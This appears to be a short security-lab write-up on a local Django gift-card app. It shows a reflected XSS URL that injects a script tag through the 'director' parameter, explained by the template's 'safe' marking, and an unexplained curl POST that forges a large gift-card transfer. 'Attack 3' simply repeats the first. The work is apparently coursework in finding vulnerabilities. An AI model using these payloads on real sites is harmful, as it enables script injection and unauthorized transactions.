Cross site scripting vulnerability: 

I crafted this http get request: http://127.0.0.1:8000/buy.html?director=<script>alert('xxs')</script>attacked%21 which allows me to print the malicious message on the screne 'Endorssed by Attacked!!'.
This vulerability exsists in the urls that access the buy_cards_view. In this view, when a GET request is submitted with the 'director' variable set the item_single.html template is rendered. In this template, if the director value is not none it prints 'Endorsed by' the value of the director variable which can be set by user data submitted in the  http request. Normally, django would filter out such user generated input but this variable value is marked as 'safe' which allows user generated input to print to the site and the attack to succeed.

Attack 2:
curl -i -s -k -X $'POST'     -H $'Host: 127.0.0.1:8000' -H $'Content-Length: 29' -H $'Cache-Control: max-age=0' -H $'sec-ch-ua: \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"' -H $'sec-ch-ua-mobile: ?0' -H $'sec-ch-ua-platform: \"Windows\"' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: http://127.0.0.1:8000/gift.html' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close'     --data-binary $'amount=2422333&username=user1'     $'http://127.0.0.1:8000/gift/0' 

Attack 3:


http://127.0.0.1:8000/buy.html?director=<script>alert('xxs')</script>attacked%21
